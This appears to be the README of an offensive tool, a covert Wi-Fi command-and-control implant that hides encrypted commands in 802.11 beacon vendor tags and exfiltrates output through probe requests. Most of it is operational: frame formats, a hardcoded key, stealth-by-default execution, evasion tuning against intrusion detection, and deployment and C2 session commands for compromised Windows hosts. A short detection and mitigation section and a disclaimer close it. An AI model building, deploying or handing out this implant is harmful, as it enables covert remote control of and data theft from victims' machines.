# Covert Wi-Fi C2 v3.0 — Vendor Specific Elements (Next-Gen)

This write-up documents a high-bandwidth covert command channel that uses **802.11 Vendor Specific Elements (Tag 221)** as a bidirectional C2 transport:

> **Project Context:** This technique is a modular component of the next-generation **Audix C2 Framework**, currently under development and scheduled for release in **Q2 2026**.
> [Learn more about the Audix C2](https://www.security-auditing.com/C2)

- **Server (Python / Kali, monitor mode):**  
  Injects beacon frames with **hidden payloads inside VSE tags**, appearing as a legitimate access point.
- **Agent (Windows / WLAN API):**  
  Scans for nearby Wi-Fi networks, parses raw Information Elements (IEs), extracts VSE payloads, reassembles commands, executes them, and **exfiltrates responses via Probe Requests**.

No association to any access point is required. A powered-on machine with a Wi-Fi card is sufficient.

---

## 1. What's New in v3.0

Version 3.0 is a full-stack rewrite with 7 major improvements:

| # | Feature | Description |
|:--|:--------|:------------|
| 1 | **AES-256-CTR** | Replaces RC4. Per-message random 12-byte nonce via BCrypt (agent) and PyCryptodome (server). |
| 2 | **ACK / Retransmit** | Agent ACKs received commands; server ACKs received responses. Both stop retransmitting on ACK. |
| 3 | **Stealth by Default** | No console window, `CreateProcess` with `CREATE_NO_WINDOW`. Use `-debug` for console output during testing. |
| 4 | **OUI Rotation** | Session OUI derived from PSK via SHA-256 — no hardcoded magic bytes for IDS to match. |
| 5 | **Job Queue** | Server-side FIFO queue. Stack multiple commands; each auto-advances after ACK. |
| 6 | **Channel Hopping** | Shared PRNG schedule derived from PSK + wall-clock time. Both sides compute the same channel independently. |

---

## 2. Evolution: v1.0 → v2.0 → v3.0

| Feature | **v1.0 (SSID)** | **v2.0 (VSE)** | **v3.0 (Next-Gen)** |
|:---|:---|:---|:---|
| **Transport** | SSID Field | VSE Tag 221 | VSE Tag 221 |
| **Encryption** | Base64 only | RC4 + Base64 | **AES-256-CTR** + Base64 |
| **Key Management** | None | Hardcoded 16B key | 32B PSK, per-message nonce |
| **Downstream BW** | ~30 B/pkt | ~1.2 KB/pkt | ~1.2 KB/pkt |
| **Upstream BW** | None | ~21 B/pkt | ~20 B/pkt |
| **Reliability** | Low | Medium (loop) | **High** (ACK + retransmit + queue) |
| **Signatures** | Visible SSIDs | Hardcoded OUI `00:40:96` | **Derived OUI** (no static fingerprint) |
| **Channel** | Fixed | Fixed (ch 6) | **Hopping** (1, 6, 11 — PRNG schedule) |
| **Agent Liveness** | Unknown | Unknown | Discovered on first ACK/response |
| **Stealth** | None | Jitter + vendor spoof | Jitter + vendor spoof + **stealth by default (no console, CreateProcess)** |
| **Multi-Command** | No | One at a time | **FIFO job queue** |

---

## 3. Over-The-Air Protocol & Frame Format

### 3.1 v3.0 Header Structure (12 bytes)

Both downstream (VSE) and upstream (Probe SSID) use the same header layout:

```text
Offset  Size  Field         Description
------  ----  -----         -----------
0       3     Session OUI   Derived from SHA-256(PSK || "WIFIAIR_OUI_V3")[:3]
3       1     Msg Type      0x01=CMD, 0x02=ACK, 0x04=RESPONSE
4       1     Agent ID      Target/source agent (0 = broadcast)
5       2     Job ID        Unique job identifier (big-endian)
7       2     Sequence      Fragment number, 1-based (big-endian)
9       2     Total         Total fragments in job (big-endian)
11      1     Flags         Bit 1: ENCRYPTED
12      N     Data          Payload fragment (base64 encoded)
```

### 3.2 Downstream Protocol (Server → Agent)

Commands are encrypted, encoded, fragmented, and wrapped in VSE tags:

```text
[ 802.11 Beacon Frame ]
   │
   ├── [ Fixed Params ] (Timestamp, Interval, Capabilities)
   ├── [ Tag 0: SSID ] = "linksys" (Stable session identity)
   ├── [ Tag 1: Rates ] = Standard supported rates
   ├── [ Tag 3: DS Parameter Set ] = Current hop channel
   │
   ├── [ Tag 221: VSE #1 ] ◄── PAYLOAD CHUNK 1
   │     └── [ OUI: derived ] [ Type: CMD ] [ Agent ] [ Job ] [ Seq ] [ Total ] [ Flags ] [ Data... ]
   ├── [ Tag 221: VSE #2 ] ◄── PAYLOAD CHUNK 2
   ├── [ Tag 221: VSE #3 ] ◄── PAYLOAD CHUNK 3
   ├── [ Tag 221: VSE #4 ] ◄── PAYLOAD CHUNK 4
   └── [ Tag 221: VSE #5 ] ◄── PAYLOAD CHUNK 5
```

**Capacity:** 5 tags × 243 bytes = **~1.2 KB per beacon** (255 byte VSE - 12 byte header = 243 data).

### 3.3 Upstream Protocol (Agent → Server)

Responses follow the same pipeline in reverse, sent via Probe Request SSIDs:

```text
[ 802.11 Probe Request ]
   └── [ Tag 0: SSID ] (32 Bytes max)
         ├── [ Session OUI (3B) ]
         ├── [ Msg Type (1B) ] : RESPONSE (0x04)
         ├── [ Agent ID (1B) ]
         ├── [ Job ID (2B) ]
         ├── [ Seq (2B) ]
         ├── [ Total (2B) ]
         ├── [ Flags (1B) ]
         └── [ Data (20B) ] : Encrypted fragment
```

**Bandwidth:** SSID is limited to 32 bytes. After 12 bytes of header, **20 bytes of payload per packet** are available for upstream exfiltration.

### 3.4 Encryption Layer: AES-256-CTR

Both directions use **AES-256-CTR** with a 32-byte pre-shared key:

```python
# Server (Python / PyCryptodome)
PSK = bytes([
    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
])
```

```cpp
// Agent (C++ / Windows BCrypt)
static const BYTE PSK[32] = {
    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
};
```

**Per-message nonce:** Every encrypt operation generates a cryptographically random 12-byte nonce. The encrypted payload format is:

```text
[ Nonce (12 bytes) ] [ AES-256-CTR Ciphertext (N bytes) ]
```

**Why AES-256-CTR over RC4:**
- RC4 has known keystream biases and is vulnerable to related-key attacks
- RC4 with a static key produces identical ciphertext for identical plaintext (fingerprinting risk)
- AES-256-CTR with a random nonce guarantees unique ciphertext for every message
- BCrypt provides hardware-accelerated AES on modern Windows

**Processing Pipeline:**

```text
Downstream: Command → [nonce || AES-256-CTR(plaintext)] → Base64 → Fragment → VSE Tags
Upstream:   Output  → [nonce || AES-256-CTR(plaintext)] → Base64 → Fragment → Probe SSIDs
```

### 3.5 OUI Derivation (No Static Signatures)

The session OUI is deterministically derived from the PSK:

```python
SESSION_OUI = SHA256(PSK + b"WIFIAIR_OUI_V3")[:3]
```

Both server and agent compute the same OUI independently. There are no hardcoded magic bytes that an IDS could fingerprint. Changing the PSK changes the OUI.

---

## 4. ACK / Retransmit Protocol

### 4.1 Downstream ACK Flow

```text
Server                              Agent
  │                                   │
  │──── CMD beacon (loop) ──────────> │
  │                                   │ reassemble...
  │                                   │ ACK probe
  │ <── ACK probe ──────────────────  │
  │                                   │
  │ stop broadcast, advance queue     │ execute command
```

When the agent successfully reassembles a command, it immediately sends an **ACK probe** (MsgType=0x02) containing the Job ID. The server stops broadcasting that job and advances to the next job in the queue.

**Note:** ACK probes are only sent when exfil mode is enabled (`-exfil`). In **receive-only mode** (no `-exfil` flag), the agent produces zero upstream traffic — no ACKs, no probes of any kind. The server simply keeps broadcasting until the operator manually runs `stop`.

### 4.2 Upstream ACK Flow

```text
Agent                               Server
  │                                   │
  │──── RESPONSE probes (pass 1) ──>  │
  │                                   │ reassemble...
  │  ┌─ quick scan ─┐                │ ACK beacon (15x, 1.5s)
  │  │ check for ACK │<── ACK ─────── │
  │  └──── found! ───┘                │
  │                                   │
  │ stop exfil, back to scan mode     │ display output
```

When the server successfully reassembles a response, it sends an **ACK beacon** (MsgType=0x02) repeated 15 times over 1.5 seconds. Between each retransmit pass, the agent performs a **quick scan** that checks incoming beacons for this ACK. If found, the agent stops exfiltrating immediately and returns to scan mode — even if the `-duration` timeout has not expired.

This inter-pass scan also picks up any **new commands** the server is broadcasting, so the agent can queue them for execution right after the current exfil completes.

**Encrypt-once guarantee:** The response payload is encrypted once before the retransmit loop begins. Every retransmit pass sends the exact same encrypted chunks. This ensures the server can mix-and-match fragments from different passes and still decrypt correctly.

### 4.3 Stale Job Pruning

Both sides prune stale state:
- **Agent:** Active jobs older than 2 minutes are discarded. Completed jobs set is cleared at 1000 entries.
- **Server:** Incomplete response buffers older than 5 minutes are discarded with a warning.

---

## 5. Channel Hopping

### 5.1 Shared Schedule

Both sides compute the current channel from the PSK and wall-clock time:

```python
CHANNELS     = [1, 6, 11]   # Non-overlapping 2.4GHz
HOP_INTERVAL = 10           # seconds per dwell
SEED = int(SHA256(PSK + "WIFIAIR_CHANNEL_HOP")[:4])

def get_current_channel():
    slot = int(time.time()) // HOP_INTERVAL
    h = ((SEED + slot) * 2654435761) & 0xFFFFFFFF  # Knuth hash
    return CHANNELS[h % 3]
```

The server actively hops its monitor-mode interface. The agent computes the schedule for awareness but relies on Windows' standard scanning behavior (which sweeps all channels).

### 5.2 Operational Notes

- **Clock sync:** Both sides need roughly synchronized clocks (NTP). A 10-second dwell provides tolerance.
- **Disable with:** `server.py -nohop` or `server.py -channel 6` for fixed operation.
- **Dual-interface:** For simultaneous beacon injection and probe sniffing on different channels, use two Wi-Fi adapters.

---

## 6. Agent Tracking

The server discovers agents when it receives an **ACK probe** or **response data** from them (requires `-exfil` on the agent). The `agents` command shows per-agent status:

```text
C2> agents
[*] Known Agents:
    Agent   1 | ALIVE | seen 5s ago  | jobs 3
    Agent   2 | STALE | seen 120s ago | jobs 1
    Agent   3 | LOST  | seen 400s ago | jobs 0
```

| Status | Condition |
|:-------|:----------|
| **ALIVE** | Seen within 60 seconds |
| **STALE** | Seen within 300 seconds |
| **LOST** | Not seen for 300+ seconds |

**Note:** In receive-only mode (no `-exfil`), agents are invisible to the server — they execute commands silently with zero upstream traffic.

---

## 7. Job Queue

### 7.1 Server-Side FIFO

The server maintains a FIFO queue of prepared jobs. When the operator sends multiple commands, they are queued and dispatched sequentially:

```text
C2> send 1 whoami
[+] Queued Job 0xa1b2 -> Agent 1 (1 chunks, queue depth: 0)
[>] Broadcasting Job 0xa1b2 -> Agent 1 (1 chunks)

C2> send 1 ipconfig /all
[+] Queued Job 0xc3d4 -> Agent 1 (2 chunks, queue depth: 1)

C2> send 1 netstat -an
[+] Queued Job 0xe5f6 -> Agent 1 (1 chunks, queue depth: 2)

C2> queue
[*] Job queue (2 pending):
    1. Job 0xc3d4 -> Agent 1 (2 chunks)
    2. Job 0xe5f6 -> Agent 1 (1 chunks)
[*] Currently broadcasting: 0xa1b2 -> Agent 1
```

Jobs advance automatically when the agent ACKs the current job (requires `-exfil` on the agent), or manually with `skip`.

### 7.2 Queue Management Commands

| Command | Action |
|:--------|:-------|
| `stop` | Pause current broadcast (queue untouched) |
| `skip` | Stop current broadcast, immediately start next job in queue |
| `remove 2` | Remove job #2 from the queue (by position) |
| `remove 0xc3d4` | Remove a specific job by hex ID |
| `flush` | Clear entire queue and stop broadcasting |

```text
C2> queue
[*] Job queue (2 pending):
    1. Job 0xc3d4 -> Agent 1 (2 chunks)
    2. Job 0xe5f6 -> Agent 1 (1 chunks)
[*] Currently broadcasting: 0xa1b2 -> Agent 1

C2> remove 0xe5f6
[+] Removed Job 0xe5f6 -> Agent 1

C2> skip
[>] Broadcasting Job 0xc3d4 -> Agent 1 (2 chunks)
```

### 7.3 Agent-Side Exfil Queue

The agent queues response data for sequential exfiltration. If a new command arrives while the agent is exfiltrating a previous response (detected during inter-pass scanning), the new command is queued for execution once the current exfil completes.

---

## 8. Stealth by Default

The agent runs in full stealth mode by default — no console window, no visible output, no user interaction.

**Default behavior (no flags needed):**
- Console window hidden via `FreeConsole()` at startup
- All commands executed via `CreateProcess` with `CREATE_NO_WINDOW` and redirected pipes
- Zero console output

**Debug mode (`-debug` flag):**
- Console window remains visible
- Full logging output for testing and development

```powershell
# Normal operation (stealth, invisible)
agent.exe -agent 1

# Testing (visible console with full debug output)
agent.exe -agent 1 -debug
agent.exe -agent 1 -exfil -duration 60 -debug
```

---

## 9. Operating Modes

The agent supports two distinct modes based on whether `-exfil` is passed:

### 9.1 Receive-Only Mode (default)

```powershell
agent.exe -agent 1
```

- **Zero upstream traffic** — no probes of any kind are transmitted
- No ACK, no exfiltration
- Agent silently receives and executes commands
- Ideal for long-range one-way scenarios (directional antenna, parking lot ops)
- The operator assumes the command was delivered and relies on the target reaching the internet or other side-channel for confirmation

### 9.2 Bidirectional Mode

```powershell
agent.exe -agent 1 -exfil -duration 60
```

- Full upstream: ACK probes, response exfiltration
- Server auto-advances job queue on ACK
- Agent stops exfil early when server ACKs the response
- Requires physical proximity for upstream (probe request range ~50-100m)

---

## 10. Usage / Workflow

### 10.1 Requirements

**Attacker / Operator:**
- Kali Linux with:
  - Wi-Fi card supporting **monitor mode** and **injection**
  - Python 3 with `scapy`, `pycryptodome` installed
- Physical proximity to target

**Target Host:**
- Windows 8+ with Wi-Fi enabled
- WLAN service active
- Agent binary deployed (via initial compromise, USB, physical access)

### 10.2 Server Setup (Kali)

```bash
# Install dependencies
pip install scapy pycryptodome

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Start server with response listener and channel hopping
sudo python3 server.py -listen -i wlan0mon

# Or: fixed channel (no hopping)
sudo python3 server.py -listen -i wlan0mon -channel 6
```

### 10.3 Agent Compilation

**Visual Studio:**

Open solution → Build as Release x64.

**MinGW:**

```bash
g++ WIFIAIR-C2-Channel-VSE.cpp -o agent.exe -lwlanapi -lbcrypt -static
```

### 10.4 Agent Deployment (Windows)

```powershell
# Receive-only (stealth, zero upstream traffic)
agent.exe -agent 1

# Bidirectional (stealth, ACK + exfil)
agent.exe -agent 1 -exfil -duration 60

# Debug mode (visible console for testing)
agent.exe -agent 1 -exfil -duration 60 -debug

# Custom jitter
agent.exe -agent 1 -exfil -duration 120 -jitter 1000 3000
```

### 10.5 Server Commands

```text
C2> send 1 whoami                 # Send to Agent 1
C2> send 0 hostname               # Broadcast to all agents
C2> send 2 dir C:\Users           # List directory
C2> send 1 ipconfig /all          # Shell command (queued)
C2> stop                           # Stop current broadcast
C2> skip                           # Stop current, start next in queue
C2> queue                          # Show pending jobs
C2> remove 2                       # Remove job #2 from queue
C2> remove 0xa1b2                  # Remove job by hex ID
C2> flush                          # Clear entire queue + stop
C2> agents                         # Show known agents
C2> status                         # Show server state
C2> responses                      # Show pending response buffers
C2> hop on                         # Enable channel hopping
C2> hop off                        # Disable channel hopping
C2> jitter 50 200                  # Set beacon jitter (ms)
C2> clear                          # Clear response history
C2> exit                           # Quit
```

### 10.6 Example Session

```text
C2> send 1 whoami
[+] Queued Job 0xa1b2 -> Agent 1 (1 chunks, queue depth: 0)
[>] Broadcasting Job 0xa1b2 -> Agent 1 (1 chunks)
[+] ACK from Agent 1 for Job 0xa1b2 - command delivered
[<] Agent 1 responding (Job 0xa1b2, 2 chunks)...
============================================================
[+] Agent 1 | Job 0xa1b2 | 4.2s
============================================================
desktop-vixx\user
============================================================
```

Meanwhile on the agent (with `-exfil -duration 60`):

```text
[*] New Job 0xa1b2 (Target: Agent 1)
[+] EXECUTE: whoami
[+] ACK sent for Job 0xa1b2
[+] OUTPUT (18 bytes):
desktop-vixx\user
[*] Exfiltrating Job 0xa1b2 (18 bytes)...
[*] Exfil Job 0xa1b2: 40B b64 (2 chunks)
.. [DONE]
[+] Server ACK received! Stopping exfil early.    ← stopped at ~8s instead of 60s
[*] Exfil complete for Job 0xa1b2
[*] Exfil queue drained. Returning to scan mode.
```

---

## 11. Bandwidth & Limitations

### 11.1 Bandwidth

| Direction | Method | Bandwidth | Capacity |
|:---|:---|:---|:---|
| **Downstream** | VSE Stacking (5 tags) | ~10 KB/s | Shellcode, scripts, binaries |
| **Upstream** | Probe Request SSIDs | ~50 B/s | Short text only |

### 11.2 Range Asymmetry

| Direction | Range | Reason |
|:---|:---|:---|
| **Downstream** | High (1+ km with directional antenna) | Attacker controls Tx power |
| **Upstream** | Low (~50-100m) | Victim laptop has weak internal antenna |

**Implication:** You can send commands from far away, but must be closer to receive responses. Use **receive-only mode** for long-range operations and rely on the target reaching the internet for confirmation.

### 11.3 Operational Advice

- **Keep responses short:** Use `findstr`, `head`, `| select` to filter output
- **Process on target:** Send scripts that analyze data locally, return only results
- **Avoid large exfil:** A 10MB file would take hours and generate thousands of packets

### 11.4 Tuning VSE Parameters

Two values in `server.py` control how commands are packed into beacon frames. Adjust these to trade speed for stealth:

```python
TAGS_PER_BEACON = 5    # VSE tags per beacon frame (1-5)
CHUNK_SZ = 243         # Data bytes per VSE tag (max 243 = 255 - 12 header)
```

**`TAGS_PER_BEACON`** — how many Tag 221 elements are stacked into a single beacon:

| Value | Beacon Size | Speed | Stealth |
|:------|:------------|:------|:--------|
| `5` (default) | ~1.2 KB | Fast | Lower (large beacons are anomalous) |
| `3` | ~750 B | Medium | Better |
| `1` | ~255 B | Slow | Best (single VSE looks normal) |

**`CHUNK_SZ`** — data bytes per VSE tag (before adding the 12-byte header):

| Value | VSE Size | Looks Like | Trade-off |
|:------|:---------|:-----------|:----------|
| `243` (default) | 255 B | Max-size VSE (suspicious) | Fewest packets needed |
| `100` | 112 B | Medium vendor extension | Good balance |
| `50` | 62 B | Small vendor tag | Realistic, more packets |
| `20` | 32 B | Tiny vendor tag | Very stealthy, many packets |

**Example — maximum stealth profile:**

```python
TAGS_PER_BEACON = 1    # One VSE per beacon
CHUNK_SZ = 50          # Small, realistic-looking vendor tags
```

This makes each beacon look like a normal AP with a single small vendor extension. A `whoami` command would need ~2 beacons instead of 1, but each beacon blends in with legitimate traffic.

The agent doesn't need any changes — it reassembles by sequence number regardless of chunk size or tags per beacon.

---

## 12. Security Analysis

### 12.1 Cryptographic Properties

| Property | v2.0 (RC4) | v3.0 (AES-256-CTR) |
|:---|:---|:---|
| Key size | 128-bit | **256-bit** |
| Nonce | None (static key) | **12-byte random per message** |
| Known-plaintext | Vulnerable | Resistant |
| Keystream bias | Yes (RC4 bias) | None |
| Replay protection | None | Nonce uniqueness |
| Implementation | Custom | **BCrypt** (OS-provided, audited) |

### 12.2 Signature Resistance

| Indicator | v2.0 | v3.0 |
|:---|:---|:---|
| OUI pattern | Fixed `00:40:96` / `00:40:97` | **Derived from PSK** (changes per deployment) |
| Ciphertext patterns | Identical for same command | **Unique per message** (random nonce) |
| Channel behavior | Fixed channel 6 | **Hopping** (harder to capture) |
| Console window | Always visible | **Hidden by default** (`FreeConsole`) |
| Process tree | `agent.exe → cmd.exe` | `CreateProcess` with `CREATE_NO_WINDOW` |
| Upstream traffic | Always transmitting | **Configurable** (zero in receive-only mode) |

---

## 13. Detection & Mitigation

### 13.1 Network/RF Detection

- **Anomalous VSE size:** Legitimate VSE tags are typically small. Multiple 255-byte Tag 221 elements in a single beacon are suspicious.
- **Beacon timing analysis:** Even with jitter, statistical analysis of inter-beacon intervals may reveal non-standard patterns.
- **Channel hopping correlation:** A BSSID that appears on multiple channels in a short period is unusual for a real AP.
- **Probe Request entropy:** High-entropy SSIDs in Probe Requests, especially with consistent 32-byte lengths.
- **Volume anomaly:** Bursts of Probe Requests from a single station during exfil mode.

### 13.2 Host-Based Detection

- **WLAN API abuse:** Non-system processes calling `WlanGetNetworkBssList` or `WlanScan` at high frequency.
- **BCrypt usage patterns:** A non-browser process using `BCryptEncrypt` with AES + `BCryptGenRandom` together.
- **Stealth indicators:** Process calling `FreeConsole()` shortly after start, or `CreateProcess` with `CREATE_NO_WINDOW`.

### 13.3 Mitigation

- **Disable Wi-Fi** on air-gapped systems (hardware kill switch preferred)
- **Application whitelisting** to block unknown binaries
- **Wireless IDS** monitoring for anomalous beacon/probe activity
- **Physical security** with RF sweeps of sensitive areas
- **EDR rules** for WLAN API abuse by non-system processes

### 13.4 MITRE ATT&CK Mapping

- **T1071.001** — Application Layer Protocol (adapted to 802.11)
- **T1095** — Non-Application Layer Protocol
- **T1020** — Automated Exfiltration
- **T1029** — Scheduled Transfer (blocking exfil mode)
- **T1027** — Obfuscated Files or Information (AES-256 encryption)
- **T1573** — Encrypted Channel
- **T1132** — Data Encoding (Base64)

---

## 14. Summary

WIFIAIR v3.0 delivers a production-grade covert Wi-Fi C2 channel with:

- **AES-256-CTR encryption** with per-message random nonces (via BCrypt)
- **ACK/retransmit protocol** with inter-pass scanning — server ACK stops exfil early
- **Derived OUI** eliminating static IDS signatures
- **FIFO job queue** with `skip`, `remove`, and `flush` for full queue control
- **Channel hopping** on a shared PRNG schedule
- **Agent tracking** via ACK probes and response data
- **Stealth by default** with `FreeConsole` and `CreateProcess` + `CREATE_NO_WINDOW` (`-debug` for testing)
- **Receive-only mode** with zero upstream traffic for long-range operations
- **Encrypt-once exfil** ensuring fragments from different retransmit passes are always compatible

The technique is relevant for:

- **Red teams** conducting close-access operations
- **Defenders** building RF-aware threat models
- **Researchers** studying covert channel capacity in 802.11

---

## 15. Disclaimer

**Educational Purpose Only.**

This software is a Proof of Concept (PoC) designed to demonstrate the risks of air-gapped networks and 802.11 management frame manipulation. Do not use this tool on networks or systems you do not own or have explicit written permission to test.
